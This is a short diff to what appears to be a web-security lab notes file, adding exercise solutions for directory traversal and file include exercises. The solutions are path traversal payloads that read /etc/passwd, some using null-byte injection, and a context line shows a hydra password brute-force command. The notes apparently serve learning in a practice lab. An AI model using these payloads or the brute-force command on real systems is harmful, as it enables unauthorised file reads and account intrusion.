@@ -56,4 +56,11 @@ hydra -P /usr/shared/wordlists/rockyou.txt
 | excercise | solution |
 |-----------|----------|
 | example&nbsp;1 | ../../../../../../../../../etc/passwd |
-| example&nbsp;2 | /var/www/files/../../../../../../etc/passwd |
+| example&nbsp;2 | /var/www/files/../../../etc/passwd |
+| example&nbsp;3 | ../../../etc/passwd%00 `Null Bytes Injection` |
+
+## File Include
+| excercise | solution |
+|-----------|----------|
+| example&nbsp;1 | ../../../../../../../../../etc/passwd |
+| example&nbsp;2 | ../../../etc/passwd%00 `Null Bytes Injection` |
